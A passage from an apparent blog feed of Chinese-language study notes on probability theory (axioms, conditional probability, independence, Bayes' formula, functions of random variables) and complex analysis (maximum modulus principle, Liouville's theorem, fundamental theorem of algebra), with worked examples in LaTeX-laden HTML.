$\lambda(x)=\alpha\dfrac{x^{\alpha-1}}{\beta^\alpha},\alpha,\beta&gt;0$, 则 $F(x)=1-e^{-(\dfrac{x}{\beta})^{\alpha}}\Rightarrow$ <strong>Weibull</strong> 分布.</p></li></ul></li></ul><h2 id="随机变量的函数"><a href="#随机变量的函数" class="headerlink" title="随机变量的函数"></a>随机变量的函数</h2><ul><li><p><strong>定义</strong>  $Y=g(X)$ </p></li><li><p><strong>例</strong>  $X\sim Exp(\lambda)$.</p></li><li><p><strong>解答</strong><br>$$<br>Y=<br>\begin{cases}<br>1,,x&gt;t_0 \<br>0,,x\le t_0 \<br>\end{cases}<br>\quad t_0&gt;0,给定.<br>$$<br>那么有 $P(Y=0)=1-e^{-\lambda t_0}$, $P(Y=1)=e^{-\lambda t_0}$.</p></li><li><p><strong>例</strong>  $X$ 连续, 其 <strong>PDF</strong> 为 $f(x)$, 且 $Y=X^2$.</p></li><li><p><strong>解答</strong>   $\forall y&gt;0$, 我们有<br>$$<br>\begin{aligned}<br>P(Y\le y)&amp;=P(X^2\le y)\<br>&amp;=P(-\sqrt{y}\le X\le\sqrt{y})\<br>&amp;=\int_{-\sqrt{y}}^{\sqrt{y}}f(x)dx\<br>&amp;=\int_0^yl(t)dt.<br>\end{aligned}<br>$$<br>其中 $Y$  的 <strong>PDF</strong> 为 $l(y)=\dfrac{1}{2\sqrt{y}}(f(\sqrt{y})+f(-\sqrt{y}))$.</p></li><li><p><strong>例</strong>  $X\sim N(0,1)$, 且 $Y=X^2$.</p></li><li><p><strong>解答</strong>  $Y$  的 <strong>PDF</strong> 为<br>$$<br>l(y)=\dfrac{1}{\sqrt{2\pi}}\dfrac{1}{\sqrt{y}}e^{-\dfrac{y}{2}}<br>$$<br>这是自由度为 $1$ 的 <strong>Chi-Square</strong> 分布 $\chi^2(1)$.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记1</title>
      <link href="/46/"/>
      <url>/46/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-1-概率"><a href="#Chap-1-概率" class="headerlink" title="Chap 1 概率"></a>Chap 1 概率</h1><h2 id="试验与事件"><a href="#试验与事件" class="headerlink" title="试验与事件"></a>试验与事件</h2><ul><li><p><strong>定义(随机试验)</strong></p><ul><li>不能预先确知结果;</li><li>试验之前可预测所有可能结果.</li></ul></li><li><p><strong>定义(样本空间)</strong>  一个试验所有可能结果之集 $(\Omega)$.</p></li><li><p><strong>定义(随机事件)</strong>  $a$ $well$ $defined$ $subset$ $A\in\Omega$.</p><ul><li>全事件 $\Omega$ (必然事件);</li><li>空事件 $\varPhi$ (不可能事件);</li><li>单一试验结果 (基本事件).</li></ul></li></ul><h2 id="事件的运算"><a href="#事件的运算" class="headerlink" title="事件的运算"></a>事件的运算</h2><ul><li><p>借助集合的语言 $or$ $Venn$ 图.</p><ul><li>余: $A^c-(\Omega\backslash A)$;</li><li>和: $A+B-(A\cup B)$;</li><li>差: $A-B-(A\backslash B)$;</li><li>积: $AB-(A\cap B)$;</li><li>互斥: $AB = \varnothing$;</li><li>对立: $AB = \varnothing, A + B = \Omega$;</li><li><strong>De Morgan</strong> 定律: $(A + B)^c = A^cB^c$ $(\sum_n A_n)^c = \prod_n A_n^c$.</li></ul></li></ul><h2 id="概率的几种解释"><a href="#概率的几种解释" class="headerlink" title="概率的几种解释"></a>概率的几种解释</h2><ul><li>古典解释 - 基于等可能性;</li><li>频率解释;</li><li>主观解释.</li></ul><h2 id="公理化定义"><a href="#公理化定义" class="headerlink" title="公理化定义"></a>公理化定义</h2><ul><li><p>$2^{\Omega}\Rightarrow\Omega$ 的所有子集构成的集合.</p></li><li><p>事件集类 $\mathscr{F}\subset\Omega\Rightarrow\sigma{-}$代数: 事件运算的封闭性.</p></li><li><p>特别地, </p><p>$$<br>\sum_{i = 1}^{\infty}A_i\in\mathscr{F}, \forall A_i\in\mathscr{F}.<br>$$</p></li><li><p><strong>定义(Kolmogorov)</strong><br>  $$<br>  P: \mathscr{F}\rightarrow\mathbb{R} \<br>  $$<br>  满足以下三条公理:</p><ul><li>$P(A)\ge 0, \forall A\in\mathscr{F}$</li><li>$P(\Omega) = 1$</li><li>$P(\sum_{i = 1}^{\infty}A_i) = \sum_{i = 1}^{\infty}P(A_i), A_iA_j = \varnothing, \forall i\ne j$</li></ul><p>  则称 $P$ 为概率函数, $(\Omega, \mathscr{F}, P)$ 为概率空间.</p></li><li><p><strong>命题</strong></p><ul><li>$P(A)\le1, \forall A\in\mathscr{F}$;</li><li>$P(\varPhi) = 0$;</li><li>$P(A^c) = 1 - P(A)$;</li><li>$P(\sum_{i = 1}^{n}A_i) = \sum_{i = 1}^{n}P(A_i), A_iA_j = \varnothing, \forall i\ne j$;</li><li>$P(A)\le P(B), \forall A\subset B$;</li><li>$P(A + B) = P(A) + P(B) - P(AB)$.</li></ul></li><li><p><strong>推广</strong></p><p>$P(\sum_\limits{i = 1}^{n}A_i) = \sum_\limits{i = 1}^{n}P(A_i) - \sum_\limits{i_1&lt;i_2}P(A_{i_1}A_{i_2}) + \cdots + (-1)^{r - 1}\sum_\limits{i_1 &lt; \cdots &lt; i_r}P(A_{i_1}\cdots A_{i_r}) + \cdots$</p></li><li><p><strong>例</strong>  $n$ 个人, 每人一顶帽子, 随机挑选一顶帽子. 无人拿到自己帽子的概率为? 恰有 $k$ 人拿到自己帽子的概率为?</p></li><li><p><strong>解答</strong>  令 $A_i = $ 第 $i$ 个人拿到自己帽子. 注意到<br>$$<br>P(A_i) = \cfrac{1}{n}.<br>$$<br>运用排列组合知识可得<br>$$<br>P(A_{i_1}\cdots A_{i_r}) = \cfrac{(n - r)!}{n!},\<br>\sum_\limits{i_1 &lt; \cdots &lt; i_r}P(A_{i_1}\cdots A_{i_r}) = \cfrac{(n - r)!}{n!}C_n^r = \cfrac{1}{r!}.<br>$$<br>故至少有一个人拿到自己帽子的概率为<br>$$<br>\begin{equation*}<br>\begin{aligned}<br>P(\sum_\limits{i = 1}^{n}A_i) &amp;= \sum_\limits{r = 1}^{n}(-1)^{r - 1}\sum_\limits{i_1 &lt; \cdots &lt; i_r}P(A_{i_1}\cdots A_{i_r}) \<br>&amp;= \sum_\limits{r = 1}^{n}(-1)^{r - 1}\cfrac{1}{r!}.<br>\end{aligned}<br>\end{equation*}<br>$$<br>无人拿到自己帽子的概率为<br>$$<br>\begin{equation*}<br>\begin{aligned}<br>P_n &amp;= 1 - P(\sum_\limits{i = 1}^{n}A_i) \<br>&amp;= 1 - \sum_\limits{r = 1}^{n}(-1)^{r - 1}\sum_\limits{i_1 &lt; \cdots &lt; i_r}P(A_{i_1}\cdots A_{i_r}) \<br>&amp;= \sum_\limits{r = 0}^{n}(-1)^{r}\cfrac{1}{r!} \<br>&amp;= \cfrac{1}{e}.<br>\end{aligned}<br>\end{equation*}<br>$$</p></li></ul><h2 id="条件概率"><a href="#条件概率" class="headerlink" title="条件概率"></a>条件概率</h2><ul><li><p><strong>定义(条件概率)</strong>  $P(A\mid B) := \cfrac{P(AB)}{P(B)},( 需,P(B) &gt; 0)$.</p></li><li><p>$A\mid B$ 不是事件.</p></li><li><p><strong>计算</strong>  $(1)$ 缩小样本空间; $(2)$ 定义.</p></li><li><p><strong>定义(乘法法则)</strong>  $P(AB) = P(A\mid B)P(B) = P(B\mid A)P(A).$</p></li><li><p><strong>例</strong>  $8$ 个红球, $4$ 个白球, 等可能无放回地取出 $2$ 红球的概率为?</p></li><li><p><strong>解答</strong>  无放回地取出 $2$ 红球的概率为<br>$$<br>P(R_1R_2) = P(R_1)P(R_2\mid R_1) = \cfrac{8}{12}\times\cfrac{7}{11} = \cfrac{14}{33}.<br>$$</p></li><li><p><strong>推广</strong></p><p>$P(A_1A_2\cdots A_n) = P(A_1)P(A_2\mid A_1)P(A_3\mid A_1A_2)\cdots P(A_n\mid A_1A_2\cdots A_{n - 1}).$</p></li><li><p><strong>解答续</strong>  在配对问题中, 注意到<br>  $$<br>  \begin{equation*}<br>  \begin{aligned}<br>P(A_{i_1}\cdots A_{i_r}) &amp;= P(A_{i_1})P(A_{i_2}\mid A_{i_1})\cdots P(A_{i_r}\mid A_{i_1}A_{i_2}\cdots A_{i_{r - 1}}) \<br>&amp;= \cfrac{1}{n}\cdot\cfrac{1}{n - 1}\cdot\cfrac{1}{n - 2}\cdots\cfrac{1}{n - (r - 1)} \<br>&amp;= \cfrac{(n - r)!}{n!}.<br>  \end{aligned}<br>  \end{equation*}<br>  $$</p></li><li><p><strong>定义</strong><br>  $$<br>  P(\cdot\mid B): \mathscr{F}\rightarrow\mathbb{R}<br>  $$<br>  令 $\widetilde{P} = P(\cdot\mid B)$, 则 $\widetilde{P}$ 满足以下三条公理:</p><ul><li>$\widetilde{P}(A)\ge 0, \forall A\in\mathscr{R}$</li><li>$\widetilde{P}(\Omega) = 1$</li><li>$\widetilde{P}(\sum_{i = 1}^{\infty}A_i) = \sum_{i = 1}^{\infty}\widetilde{P}(A_i), A_iA_j = \varnothing, \forall i\ne j$</li></ul><p>  故 $\widetilde{P}$ 为概率函数, $(\Omega, \mathscr{F}, \widetilde{P})$ 为新概率空间.</p></li><li><p><strong>注</strong></p><ul><li>$P(A),\textbf{v.s.},\widetilde{P}(A) = P(A\mid B)$;</li><li>“已观测到 $A$ 发生, 则 $P(A) = 1$” 这句话是错误的, 因为 $P(A\mid A) = 1$.</li></ul></li></ul><h2 id="独立事件"><a href="#独立事件" class="headerlink" title="独立事件"></a>独立事件</h2><ul><li><p><strong>定义(独立事件)</strong>  若 $P(AB) = P(A)P(B)$, 则称事件 $A, B$ 相互独立.</p></li><li><p><strong>注</strong></p><ul><li>此时 $P(A\mid B) = P(A)$, 即 $\cfrac{P(AB)}{P(B)} = \cfrac{P(A\Omega)}{P(\Omega)}$;</li><li>事件 $B$ 的发生未改变 $A$ 发生的概率;</li><li>从实际角度判断可应用定义中的关系式; 一般利用定义判断独立性.</li></ul></li><li><p><strong>例</strong>  中奖率为 $10^{-5}$ 的彩票每周开奖, 不累积, 一个人购彩十年未中奖的概率为?</p></li><li><p><strong>解答</strong></p><p>每次购彩事件都是独立的.</p><p>设事件 $A_i = $ 第 $i$ 周未中奖, 那么 $P(A_i) = 1 - 10^{-5}$.</p><p>故 $P = P(A_1A_2\cdots A_{520}) = (1 - 10^{-5})^520 = 99.48%$. </p></li><li><p>事件 $A, B$ 相互独立, 则事件 $A^c, B$ 相互独立.</p></li><li><p><strong>推广</strong></p><ul><li><p>$A, B, C,相互独立\Leftrightarrow P(ABC) = P(A)P(B)P(C),且,A, B, C,两两独立$;</p></li><li><p>$A, B, C,两两独立\nRightarrow A, B, C,相互独立$</p><p>  (反例) 甲乙两人抛掷 $2$ 枚硬币. $A =$ 甲正, $B =$ 乙正, $C =$ 甲乙同.</p></li></ul></li><li><p><strong>定义(相互独立)</strong></p><p>  $A_1, A_2, \cdots, A_n,相互独立\Leftrightarrow 任,m,个事件,A_{i_1},\cdots, A_{i_m}, 有 P(A_{i_1}\cdots A_{i_m}) = P(A_{i_1})\cdots P(A_{i_m}).$</p></li><li><p><strong>定义(条件独立)</strong></p><p>  $A, B$ 关于事件 $E$ 条件独立 $\Leftrightarrow P(AB\mid E) = P(A\mid E)P(B\mid E)$.</p></li><li><p><strong>注</strong>  条件独立与独立不可互推.</p></li></ul><h2 id="textbf-Bayes-公式"><a href="#textbf-Bayes-公式" class="headerlink" title="$\textbf{Bayes}$ 公式"></a>$\textbf{Bayes}$ 公式</h2><ul><li><p><strong>定义(全概率公式)</strong>  给出 $\Omega$ 的一个分割</p><ul><li>$\sum_iB_i = \Omega$;</li><li>$B_iB_j = \varnothing, \forall,i\ne j$;</li><li>$P(B_i) &gt; 0, \forall,i$.</li></ul><p>则有<br>$$<br>P(A) = P(\sum_i(AB_i)) = \sum_iP(AB_i) = \sum_iP(A\mid B_i)P(B_i).<br>$$</p></li><li><p><strong>定义(Bayes 公式)</strong><br>  $$<br>  P(B_i\mid A) = \dfrac{P(A\mid B_i)P(B_i)}{\sum_jP(A\mid B_j)P(B_j)}<br>  $$<br>  其中 $P(B_i)$ 为先验概率, $P(B_i\mid A)$ 为后验概率.</p></li><li><p><strong>例</strong>  $A =$ 阳性, $B =$ 患病, $P(B) = 10^{-4}$, $P(A\mid B) = 0.99$, $P(A\mid B^c) = 10^{-3}$. 求 $P(B\mid A)$, $P(B\mid A_1A_2)$.</p></li><li><p><strong>解答</strong>  由 <strong>Bayes</strong> 公式, 容易得到<br>  $$<br>  \begin{equation*}<br>  \begin{aligned}<br>      P(B\mid A)&amp;= \dfrac{P(AB)}{P(A)} \<br>      &amp;= \dfrac{P(A\mid B)P(B)}{P(A)} \<br>      &amp;= \dfrac{P(A\mid B)P(B)}{P(A\mid B)P(B) + P(A\mid B^c)P(B^c)} \<br>      &amp;= 9.01%.<br>  \end{aligned}<br>  \end{equation*}<br>  $$</p><p>  $$<br>  \begin{equation*}<br>  \begin{aligned}<br>      P(B\mid A_1A_2)&amp;= \dfrac{P(A_1A_2B)}{P(A_1A_2)} \<br>      &amp;= \dfrac{P(A_1A_2\mid B)P(B)}{P(A_1A_2)} \<br>      &amp;= \dfrac{P(A_1A_2\mid B)P(B)}{P(A_1A_2\mid B)P(B) + P(A_1A_2\mid B^c)P(B^c)} \<br>      &amp;= \dfrac{P(A\mid B)^2P(B)}{P(A\mid B)^2P(B) + P(A\mid B^c)^2P(B^c)} \<br>      &amp;= 98.99%.<br>  \end{aligned}<br>  \end{equation*}<br>  $$</p></li></ul><h2 id="一些讨论"><a href="#一些讨论" class="headerlink" title="一些讨论"></a>一些讨论</h2><ul><li>什么是概率?<ul><li>不确定性的一种度量;</li><li>具有不同的解释;</li><li>公理化定义.</li></ul></li><li>为什么用概率?<ul><li>不确定性的来源<ul><li>被建模系统的内在随机性;</li><li>不完全观测 (<strong>Monty Hall</strong> 中的参与者);</li><li>不完全建模.</li></ul></li><li>很多情况下, 简单而不确定的规则好于复杂而确定的规则</li><li>应用、维护、沟通</li></ul></li><li>怎么用概率?<ul><li>计算正确的概率;</li><li>正确计算概率;</li><li>正确使用概率.</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复变函数</title>
      <link href="/45/"/>
      <url>/45/</url>
      
        <content type="html"><![CDATA[<h3 id="1-解析函数"><a href="#1-解析函数" class="headerlink" title="1. 解析函数"></a>1. 解析函数</h3><p>$\textbf{Example:}$<br>对于 $x, y\in\mathbb{R}$, 求 $\cos(x + iy)$ 的实, 虚部, 并说明方程<br>$$\cos(x + iy) = A + iB\thinspace(A, B\in\mathbb{R})$$</p><p>有无穷多组解.&nbsp;◻</p><p>$\textbf{Solution:}$<br>由于 $$\cos z = \frac{1}{2}\left(e^{iz} + e^{-iz}\right),$$</p><p>得到 $$\begin{aligned}<br>            \cos(x + iy) &amp;= \frac{1}{2}\left(e^{-y + ix} + e^{y - ix}\right) \<br>            &amp;= \frac{1}{2}\left[e^{-y}\left(\cos x + i\sin x\right) + e^y\left(\cos x - i\sin x\right)\right] \<br>            &amp;= \frac{1}{2}\cos x\left(e^y + e^{-y}\right) + \frac{1}{2}\sin x\left(e^{-y} - e^y\right)i.<br>        \end{aligned}$$</p><p>于是 $$\Re\cos(x + iy) = \frac{1}{2}\cos x\left(e^y + e^{-y}\right),$$<br>$$\Im\cos(x + iy) = \frac{1}{2}\sin x\left(e^{-y} - e^y\right).$$</p><p>考虑方程组 $$\begin{cases}<br>            \frac{1}{2}\cos x\left(e^y + e^{-y}\right) = A, \<br>            \frac{1}{2}\sin x\left(e^{-y} - e^y\right) = B.<br>        \end{cases}$$</p><p>$(1)$ 若$B = 0$:</p><p>$(a)$ $A &gt; 1$ 时,</p><p>取 $x = 2k\pi, \thinspace k\in\mathbb{Z}$, 考虑<br>$$f(y) = e^y + e^{-y} - 2A.$$</p><p>因为 $$f(0) = 2 - 2A &lt; 0, \thinspace f(+\infty) = +\infty,$$</p><p>由介值定理得 $$\exists\thinspace y_1 &gt; 0, \thinspace f(y_1) = 0.$$</p><p>那么 $$\begin{cases}<br>            x = 2k\pi, \<br>            y = y_1,<br>        \end{cases}$$</p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(b)$ $A &lt; -1$ 时,</p><p>取 $x = 2k\pi + \pi, \thinspace k\in\mathbb{Z}$, 考虑<br>$$g(y) = e^y + e^{-y} + 2A.$$</p><p>因为 $$g(0) = 2 + 2A &lt; 0, \thinspace g(+\infty) = +\infty,$$</p><p>由介值定理得 $$\exists\thinspace y_2 &gt; 0, \thinspace g(y_2) = 0.$$</p><p>那么 $$\begin{cases}<br>            x = 2k\pi + \pi, \<br>            y = y_2,<br>        \end{cases}$$</p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(c)$ $-1\le A\le 1$ 时,</p><p>取 $y = 0$, 考虑 $$\cos x = A.$$</p><p>那么 $$\begin{cases}<br>            x = \arccos A + 2k\pi, \<br>            y = 0,<br>        \end{cases}$$</p><p>为原方程的解, $\forall k\in\mathbb{Z}$.</p><p>$(2)$ 若$B \ne 0$:</p><p>可得<br>$$\left(\frac{2A}{e^y + e^{-y}}\right)^2 + \left(\frac{2B}{e^{-y} - e^y}\right)^2 = 1.$$</p><p>令<br>$$h(y) = \left(\frac{2A}{e^y + e^{-y}}\right)^2 + \left(\frac{2B}{e^{-y} - e^y}\right)^2 - 1,$$</p><p>因为 $$h(0^{+}) = +\infty, \thinspace h(+\infty) = -1 &lt; 0,$$</p><p>由介值定理得 $$\exists\thinspace y_{AB} &gt; 0, \thinspace h(y_{AB}) = 0.$$</p><p>那么 $$\begin{cases}<br>            x = \arccos\cfrac{2A}{e^{y_{AB}} + e^{-y_{AB}}} + 2k\pi, \<br>            y = y_{AB},<br>        \end{cases}$$</p><p>为原方程的解, $\forall k\in\mathbb{Z}$.&nbsp;◻</p><h3 id="2-Cauchy高阶导数公式"><a href="#2-Cauchy高阶导数公式" class="headerlink" title="2. Cauchy高阶导数公式"></a>2. Cauchy高阶导数公式</h3><p>$\textbf{Example:}$<br>$f(z)$ 在 $D$ 内解析, 则对 $z_0\in D$, 有<br>$$f^{(n)}(z_0) = \frac{n!}{2\pi i}\oint_{\left|{z - z_0}\right| = r}\limits\frac{f(z)dz}{(z - z_0)^{n + 1}}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>由于 $f(z)$ 在 $z_0$ 处解析, 可以认为<br>$$f(z) = \sum_{k = 0}^{\infty}\limits\frac{1}{k!}f^{(k)}(z_0)(z - z_0)^k$$</p><p>在 $\left|{z - z_0}\right|\le r$ 内处处成立.</p><p>两边同时除以 $(z - z_0)^{n + 1}$, 再对 $\left|{z - z_0}\right| = r$<br>积分可得<br>$$\oint_{\left|{z - z_0}\right| = r}\limits\frac{f(z)dz}{(z - z_0)^{n + 1}} = \frac{2\pi i}{n!}f^{(n)}(z_0).$$&nbsp;◻</p><p>$\textbf{Example:}$<br>求积分<br>$$\oint_{\left|{z}\right| = 1}\limits\cfrac{1 - \cos 4z^5}{z^n}dz.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>当 $n = 0$ 时,</p><p>由于 $f(z) = 1 - \cos 4z^5$ 在复平面上处处解析,</p><p>得 $$\oint_{\left|{z}\right| = 1}\limits (1 - \cos 4z^5)dz = 0.$$</p><p>当 $n\ge 1$ 时,<br>$$\cfrac{1 - \cos 4z^5}{z^n} = \sum_{k = 1}^{\infty}\limits\cfrac{1}{z^n}\cdot(-1)^k\cfrac{(4z^5)^{2k}}{(2k)!} = \sum_{k = 1}^{\infty}\limits\cfrac{(-1)^{k + 1}4^{2k}z^{10k - n}}{(2k)!}.$$</p><p>进而<br>$$\oint_{\left|{z}\right| = 1}\limits\cfrac{1 - \cos 4z^5}{z^n}dz = \begin{cases}<br>            2\pi i\cdot\cfrac{(-1)^{k + 1}16^k}{(2k)!}, n = 10k + 1 \<br>            0, n\ne 10k + 1 \<br>        \end{cases}<br>        (\mbox{其中}k\in\mathbb{N})$$&nbsp;◻</p><h3 id="3-最大模原理"><a href="#3-最大模原理" class="headerlink" title="3. 最大模原理"></a>3. 最大模原理</h3><p>$\textbf{Example:}$<br>$f(z)$ 非常函数, 在有界域 $D$ 内可导, 在边界 $\partial D$ 上连续, 则<br>$$\max_{z\in D\cup\partial D}\limits\left|{f(z)}\right| = \max_{z\in \partial D}\limits\left|{f(z)}\right|,$$</p><p>并且满足 $f’(z_0)\ne 0$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>设 $z_0\in D\cup\partial D$ 使得<br>$f(z_0) = \max_{z\in D\cup\partial D}\limits\left|{f(z)}\right|$.</p><p>若 $z_0\in D$, 由平均值公式, $\exists\thinspace r_0 &gt; 0$,</p><p>当 $0 &lt; r\le r_0$ 时, $\left|{z - z_0}\right|$ 位于 $D$ 内. 那么<br>$$\begin{aligned}<br>            \left|{f(z_0)}\right| &amp;= \frac{1}{2\pi}\left|{\int_0^{2\pi}\limits f(z_0 + re^{i\theta})d\theta}\right| \<br>            &amp;\le \frac{1}{2\pi}\int_0^{2\pi}\limits \left|{f(z_0 + re^{i\theta})}\right|d\theta \<br>            &amp;\le \frac{1}{2\pi}\int_0^{2\pi}\limits \left|{f(z_0)}\right|d\theta \<br>            &amp;= \left|{f(z_0)}\right|,<br>        \end{aligned}$$</p><p>即<br>$\left|{f(z)}\right|\equiv \left|{f(z_0)}\right|, \thinspace\forall \left|{z - z_0}\right| &lt; r$.</p><p>进而<br>$\left|{f(z)}\right|\equiv \left|{f(z_0)}\right|, \thinspace\forall z\in D$,<br>这与 $f(z)$ 为连续非常函数矛盾.</p><p>故若<br>$\left|{f(z_0)}\right| = \max_{z\in D\cup\partial D}\limits\left|{f(z)}\right|$,<br>则有 $z_0\in\partial D$.&nbsp;◻</p><h3 id="4-最小模原理"><a href="#4-最小模原理" class="headerlink" title="4. 最小模原理"></a>4. 最小模原理</h3><p>$\textbf{Example:}$<br>$f(z)$ 非常函数, 在有界域 $D$ 内可导且非零, 在边界 $\partial D$<br>上连续, 则<br>$$\min_{z\in D\cup\partial D}\limits\left|{f(z)}\right| = \min_{z\in \partial D}\limits\left|{f(z)}\right|,$$</p><p>并且满足 $f’(z_0)\ne 0$.&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到 $\frac{1}{f(z)}$ 是解析的, 再使用最大模原理即可.&nbsp;◻</p><h3 id="5-调和函数最大值原理"><a href="#5-调和函数最大值原理" class="headerlink" title="5. 调和函数最大值原理"></a>5. 调和函数最大值原理</h3><p>$\textbf{Example:}$<br>$u(x, y)\in C^2(D)$ 为调和函数, 在边界 $\partial D$ 上连续, 则<br>$$\max_{(x, y)\in D\cup\partial D}\limits\left|{u(x, y)}\right| = \max_{(x, y)\in \partial D}\limits\left|{u(x, y)}\right|.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>由于 $u$ 为调和函数, 故存在调和函数 $v$,</p><p>其中 $u, v$ 满足 $Cauchy-Riemann$ 条件, 使得 $f(z) = u + iv$ 为解析函数.</p><p>令 $g(z) = e^{f(z)}\thinspace(z\in D\cup\partial D)$, 那么<br>$g’(z) = f’(z)e^{f(z)}$ 处处存在.</p><p>由最大模原理,<br>$$\max_{z\in D\cup\partial D}\limits\left|{g(z)}\right| = \max_{z\in \partial D}\limits\left|{g(z)}\right|.$$</p><p>又因为<br>$$\left|{g(z)}\right| = \left|{e^{f(z)}}\right| = \left|{e^{u + iv}}\right| = \left|{e^u}\right|\cdot \left|{e^{iv}}\right| = e^u,$$</p><p>故<br>$$\max_{z\in D\cup\partial D}\limits e^{u(x, y)} = \max_{z\in \partial D}\limits e^{u(x, y)}.$$</p><p>即得<br>$$\max_{z\in D\cup\partial D}\limits u(x, y) = \max_{z\in \partial D}\limits u(x, y).$$&nbsp;◻</p><h3 id="6-调和函数最小值原理"><a href="#6-调和函数最小值原理" class="headerlink" title="6. 调和函数最小值原理"></a>6. 调和函数最小值原理</h3><p>$\textbf{Example:}$<br>$u(x, y)\in C^2(D)$ 为调和函数, 在边界 $\partial D$ 上连续, 则<br>$$\min_{(x, y)\in D\cup\partial D}\limits\left|{u(x, y)}\right| = \min_{(x, y)\in \partial D}\limits\left|{u(x, y)}\right|.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到 $u_0(x, y) = -u(x, y)$ 也为 $D$ 上的调和函数,</p><p>对其使用调和函数最大值原理即可.&nbsp;◻</p><h3 id="7-M-r-的应用"><a href="#7-M-r-的应用" class="headerlink" title="7. $M(r)$的应用"></a>7. $M(r)$的应用</h3><p>$\textbf{Example:}$<br>定义<br>$$M(r) = \max_{\left|{z}\right| = r}\limits\left|{f(z)}\right|.$$&nbsp;◻</p><p>$\textbf{Example:}$<br>$f(z)$ 为整函数, 则<br>$$\left|{f^{(n)}(0)}\right|\le \frac{n!M(r)}{r^n}.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>注意到<br>$$f^{(n)}(0) = \frac{n!}{2\pi i}\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}},$$</p><p>那么 $$\begin{aligned}<br>            \left|{f^{(n)}(0)}\right| &amp;= \frac{n!}{2\pi}\left|{\thinspace\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}}}\right| \<br>            &amp;\le \frac{n!}{2\pi}\oint_{\left|{z}\right| = r}\limits\left|{\frac{f(z)}{z^{n + 1}}}\right|\left|{dz}\right| \<br>            &amp;= \frac{n!}{2\pi}\oint_{\left|{z}\right| = r}\limits\frac{\left|{f(z)}\right|}{r^{n + 1}}\left|{d(re^{i\theta})}\right| \<br>            &amp;\le \frac{n!}{2\pi}\int_{0}^{2\pi}\frac{M(r)}{r^n}d\theta \<br>            &amp;= \frac{n!M(r)}{r^n}.<br>        \end{aligned}$$&nbsp;◻</p><p>$\textbf{Example:}$<br>有界的整函数为常数**(Liouville定理)**.&nbsp;◻</p><p>$\textbf{Solution:}$<br>易得 $f(z)$ 在原点处的 $Taylor$ 展开:<br>$$f(z) = \sum_{n = 0}^{\infty}\limits\frac{1}{n!}f^{(n)}(0)z^n.$$</p><p>只需要证明 $$f^{(n)}(0)\equiv 0, \thinspace\forall\thinspace n\ge 1.$$</p><p>由 $f(z)$ 有界, 故 $\exists\thinspace M_0\in\mathbb{R}$, 使<br>$$\left|{f(z)}\right|\le M_0, \thinspace\forall z\in\mathbb{C}.$$</p><p>由<br>$$f^{(n)}(0) = \frac{n!}{2\pi i}\oint_{\left|{z}\right| = r}\limits\frac{f(z)dz}{z^{n + 1}},$$</p><p>可得<br>$$\left|{f^{(n)}(0)}\right|\le \frac{n!M(r)}{r^n}\le \frac{n!M_0}{r^n}.$$</p><p>注意到当 $r\rightarrow\infty$, 有 $$\left|{f^{(n)}(0)}\right| = 0,$$</p><p>即 $$f^{(n)}(0) = 0\thinspace, \thinspace\forall\thinspace n\ge 1.$$</p><p>从而 $f(z)\equiv f(0)$ 为常数.&nbsp;◻</p><p>$\textbf{Example:}$<br>$f(z)$ 为整函数, 且存在 $M_0 &gt; 0$, 使<br>$$\left|{f(z)}\right|\le M\sum_{k = 0}^{n}\limits\left|{z}\right|^k.$$</p><p>则 $f(z)$ 是一个次数不高于 $n$ 的多项式.&nbsp;◻</p><p>$\textbf{Solution:}$<br>易得 $f(z)$ 在原点处的 $Taylor$ 展开:<br>$$f(z) = \sum_{n = 0}^{\infty}\limits\frac{1}{n!}f^{(n)}(0)z^n.$$</p><p>只需要证明<br>$$f^{(n + i)}(0)\equiv 0, \thinspace\forall\thinspace i\ge 1.$$</p><p>可得<br>$$\left|{f^{(n + i)}(0)}\right|\le \frac{(n + i)!M(r)}{r^{n + i}}\le \frac{(n + i)!M_0}{r^{n + i}}\sum_{k = 0}^{n}\limits r^k.$$</p><p>注意到当 $r\rightarrow\infty$ 时, 有<br>$$\left|{f^{(n + i)}(0)}\right| = 0,$$</p><p>即 $$f^{(n + i)}(0) = 0, \thinspace\forall\thinspace i\ge 1.$$</p><p>从而 $$f(z)\equiv \sum_{k = 0}^{n}\limits\frac{1}{k!}f^{(k)}(0)z^k$$</p><p>为一个次数不高于 $n$ 的多项式.&nbsp;◻</p><h3 id="8-代数学基本定理"><a href="#8-代数学基本定理" class="headerlink" title="8. 代数学基本定理"></a>8. 代数学基本定理</h3><p>$\textbf{Example:}$<br>设<br>$P_n(z) = \sum_{k = 0}^{n}\limits C_kz^k\thinspace(C_n\ne 0, n\ge 1)$,<br>则 $$P_n(z) = C_n\prod_{k = 0}^{n}(z - z_k),$$</p><p>即 $$\exists z_1\in \mathbb{C}, P_n(z_1) = 0.$$&nbsp;◻</p><p>$\textbf{Solution:}$<br>设 $\forall z\in\mathbb{C}$, 有 $P_n(z)\ne 0$.</p><p>令 $f(z) = \cfrac{1}{P_n(z)}$, 则 $$f’(z) = -\cfrac{P’_n(z)}{P_n^2(z)}$$</p><p>处处存在, 那么 $f(z)$ 满足最大模原理, 有<br>$$\max_{\left|{z}\right|\le r}\limits\left|{f(z)}\right| = \max_{\left|{z}\right| = r}\limits\left|{f(z)}\right|\rightarrow 0, \mbox{当}r\rightarrow\infty.$$</p><p>但结合 $f(0) = \cfrac{1}{C_0}\ne 0$, 显然矛盾.</p><p>故 $\exists\thinspace z_1\in \mathbb{C}$, 使得<br>$$P_n(z_1) = 0\thinspace\Longleftrightarrow P_n(z) = (z - z_1)P_{n 